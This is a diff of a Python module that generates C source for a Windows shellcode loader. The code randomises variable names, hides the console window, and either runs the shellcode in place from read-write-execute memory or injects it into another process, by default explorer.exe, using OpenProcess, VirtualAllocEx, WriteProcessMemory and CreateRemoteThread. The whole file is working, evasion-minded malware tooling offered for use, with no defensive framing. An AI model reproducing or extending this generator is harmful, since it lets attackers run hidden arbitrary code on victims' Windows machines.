@@ -1,103 +1,84 @@
-from lib import gen, core
+from lib import core
+
+VAR_SHELLCODE = core.VARNAME_CREATOR()
 
 
+def MODEL():
 
-Shellcode = gen.Varname_Creator()
-Hide_Window = gen.Varname_Creator()
+    hWnd = core.VARNAME_CREATOR()
 
+    BEGIN_CODE = "#define _WIN32_WINNT 0x0500\n"
+    BEGIN_CODE += "#include <windows.h>\n"
+    BEGIN_CODE += "#include <tlhelp32.h>\n"
+    BEGIN_CODE += "#include <stdio.h>\n"
+    BEGIN_CODE += "#include <stdlib.h>\n"
+    BEGIN_CODE += "#include <time.h>\n"
+    BEGIN_CODE += "int main(int argc, char **argv){\n"
+    BEGIN_CODE += "HWND " + hWnd  + " = GetConsoleWindow();\n"
+    BEGIN_CODE += "ShowWindow(" + hWnd + ", SW_HIDE );\n"
+    BEGIN_CODE += "unsigned char " + VAR_SHELLCODE + "[] = \n"
 
-
-def Start():
-    Start_Code = "#include <windows.h>\n"
-    Start_Code += "#include <tlhelp32.h>\n"
-    Start_Code += "#include <stdio.h>\n"
-    Start_Code += "#include <stdlib.h>\n"
-    Start_Code += "#include <string.h>\n"
-    Start_Code += "int main(int argc, char **argv) {"
-    Start_Code += "char " + Shellcode + "[] = {"
-    return Start_Code
-
-
-
-def Hide_Window_Console():
-    Hide_Window_Console_Code = "};\nHWND " + Hide_Window + " = GetConsoleWindow();"
-    Hide_Window_Console_Code += "ShowWindow(" + Hide_Window + ", SW_HIDE);"
-    return Hide_Window_Console_Code
+    return BEGIN_CODE
 
 
+def LOCAL_OR_REMOTE():
+    core.LOCAL_OR_REMOTE()
 
-def Local_Or_Remote():
-    print("""
- |---------------------------------------|
- | [1] Local Thread Injection (DEFAULT); |
- | [2] Remote Thread Injection;          |
- |---------------------------------------|      
-        """)
+    CHOICE = core.CORE_INPUT()
 
-    Choice = core.core_input()
+    if CHOICE == "1":
+        VALUE_LOCAL_THREAD_INJECTION = LOCAL_THREAD_INJECTION()
+        return VALUE_LOCAL_THREAD_INJECTION
 
-    if Choice == "1":
-        Local_Thread_Injection = End_Local_Thread_Injection()
-        return Local_Thread_Injection
+    elif CHOICE == "2":
+        core.WHICH_PROCESS()
 
+        PROCESSNAME = core.CORE_INPUT()
 
-    elif Choice == "2":
-        print("""
- |-----------------------------------------------------|
- | Which process to inject ? (DEFAULT = explorer.exe); |
- |-----------------------------------------------------| 
-        """)
-
-        ProcessName = core.core_input()
-
-        if ProcessName != "":
-            Remote_Thread_Injection = End_Remote_Thread_Injection(ProcessName)
-            return Remote_Thread_Injection
+        if PROCESSNAME != "":
+            VALUE_REMOTE_THREAD_INJECTION = REMOTE_THREAD_INJECTION(PROCESSNAME)
+            return VALUE_REMOTE_THREAD_INJECTION
 
         else:
-            ProcessName = "explorer.exe"
-            Remote_Thread_Injection = End_Remote_Thread_Injection(ProcessName)
-            return Remote_Thread_Injection
-
-
+            PROCESSNAME = "explorer.exe"
+            VALUE_REMOTE_THREAD_INJECTION = REMOTE_THREAD_INJECTION(PROCESSNAME)
+            return VALUE_REMOTE_THREAD_INJECTION
     else:
-        Local_Thread_Injection = End_Local_Thread_Injection()
-        return Local_Thread_Injection
+        VALUE_LOCAL_THREAD_INJECTION = LOCAL_THREAD_INJECTION()
+        return VALUE_LOCAL_THREAD_INJECTION
 
 
+def LOCAL_THREAD_INJECTION():
+    EXEC = core.VARNAME_CREATOR()
 
-def End_Local_Thread_Injection():
-
-    Exec = gen.Varname_Creator()
-    Local_Thread_Injection = "void *" + Exec + " = VirtualAlloc(0, sizeof " + Shellcode + ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);"
-    Local_Thread_Injection += "memcpy(" + Exec + ", " + Shellcode + ", sizeof " + Shellcode + ");"
-    Local_Thread_Injection += "((void(*)())" + Exec + ")();}"
-    return Local_Thread_Injection
+    VAR_LOCAL_THREAD_INJECTION = "void *" + EXEC + " = VirtualAlloc(0, sizeof " + VAR_SHELLCODE + ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
+    VAR_LOCAL_THREAD_INJECTION += "memcpy(" + EXEC + ", " + VAR_SHELLCODE + ", sizeof " + VAR_SHELLCODE + ");\n"
+    VAR_LOCAL_THREAD_INJECTION += "((void(*)())" + EXEC + ")();\n"
+    VAR_LOCAL_THREAD_INJECTION += "}\n"
+    return VAR_LOCAL_THREAD_INJECTION
 
 
+def REMOTE_THREAD_INJECTION(PROCESSNAME):
+    ENTRY = core.VARNAME_CREATOR()
+    SNAPSHOT = core.VARNAME_CREATOR()
+    PROCESS_HANDLE = core.VARNAME_CREATOR()
+    REMOTE_THREAD = core.VARNAME_CREATOR()
+    REMOTE_BUFFER = core.VARNAME_CREATOR()
 
-def End_Remote_Thread_Injection(ProcessName):
+    VAR_REMOTE_THREAD_INJECTION = "PROCESSENTRY32 " + ENTRY + ";\n"
+    VAR_REMOTE_THREAD_INJECTION += ENTRY + ".dwSize = sizeof(PROCESSENTRY32);\n"
+    VAR_REMOTE_THREAD_INJECTION += "HANDLE " + SNAPSHOT + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
+    VAR_REMOTE_THREAD_INJECTION += "if (Process32First(" + SNAPSHOT + ", &" + ENTRY + ") == TRUE){\n"
+    VAR_REMOTE_THREAD_INJECTION += "while (Process32Next(" + SNAPSHOT + ", &" + ENTRY + ") == TRUE){\n"
+    VAR_REMOTE_THREAD_INJECTION += 'if (stricmp(' + ENTRY + '.szExeFile, ' + '"' + PROCESSNAME + '"' + ') == 0){\n'
+    VAR_REMOTE_THREAD_INJECTION += "HANDLE " + PROCESS_HANDLE + ";\n"
+    VAR_REMOTE_THREAD_INJECTION += "HANDLE " + REMOTE_THREAD + ";\n"
+    VAR_REMOTE_THREAD_INJECTION += "PVOID " + REMOTE_BUFFER + ";\n"
+    VAR_REMOTE_THREAD_INJECTION += PROCESS_HANDLE + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + ENTRY + ".th32ProcessID);\n"
+    VAR_REMOTE_THREAD_INJECTION += REMOTE_BUFFER + " = VirtualAllocEx(" + PROCESS_HANDLE + ", NULL, sizeof " + VAR_SHELLCODE + ", (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\n"
+    VAR_REMOTE_THREAD_INJECTION += "WriteProcessMemory(" + PROCESS_HANDLE + ", " + REMOTE_BUFFER + ", " + VAR_SHELLCODE + ", sizeof " + VAR_SHELLCODE + ", NULL);\n"
+    VAR_REMOTE_THREAD_INJECTION += REMOTE_THREAD + " = CreateRemoteThread(" + PROCESS_HANDLE + ", NULL, 0, (LPTHREAD_START_ROUTINE)" + REMOTE_BUFFER + ", NULL, 0, NULL);\n"
+    VAR_REMOTE_THREAD_INJECTION += "CloseHandle(" + PROCESS_HANDLE + ");}}}\n"
+    VAR_REMOTE_THREAD_INJECTION += "CloseHandle(" + SNAPSHOT + ");}\n"
 
-    Entry = gen.Varname_Creator()
-    Snapshot = gen.Varname_Creator()
-    Process_Handle = gen.Varname_Creator()
-    Remote_Thread = gen.Varname_Creator()
-    Remote_Buffer = gen.Varname_Creator()
-
-    Remote_Thread_Injection = "PROCESSENTRY32 " + Entry + ";"
-    Remote_Thread_Injection += Entry + ".dwSize = sizeof(PROCESSENTRY32);"
-    Remote_Thread_Injection += "HANDLE " + Snapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);"
-    Remote_Thread_Injection += "if (Process32First(" + Snapshot + ", &" + Entry + ") == TRUE){"
-    Remote_Thread_Injection += "while (Process32Next(" + Snapshot + ", &" + Entry + ") == TRUE){"
-    Remote_Thread_Injection += 'if (stricmp(' + Entry + '.szExeFile, ' + '"' + ProcessName + '"' + ') == 0){'
-    Remote_Thread_Injection += "HANDLE " + Process_Handle + ";"
-    Remote_Thread_Injection += "HANDLE " + Remote_Thread + ";"
-    Remote_Thread_Injection += "PVOID " + Remote_Buffer + ";"
-    Remote_Thread_Injection += Process_Handle + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + Entry + ".th32ProcessID);"
-    Remote_Thread_Injection += Remote_Buffer + " = VirtualAllocEx(" + Process_Handle + ", NULL, sizeof " + Shellcode + ", (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);"
-    Remote_Thread_Injection += "WriteProcessMemory(" + Process_Handle + ", " + Remote_Buffer + ", " + Shellcode + ", sizeof " + Shellcode + ", NULL);"
-    Remote_Thread_Injection += Remote_Thread + " = CreateRemoteThread(" + Process_Handle + ", NULL, 0, (LPTHREAD_START_ROUTINE)" + Remote_Buffer + ", NULL, 0, NULL);"
-    Remote_Thread_Injection += "CloseHandle(" + Process_Handle + ");}}}"
-    Remote_Thread_Injection += "CloseHandle(" + Snapshot + ");}"
-
-    return Remote_Thread_Injection
+    return VAR_REMOTE_THREAD_INJECTION
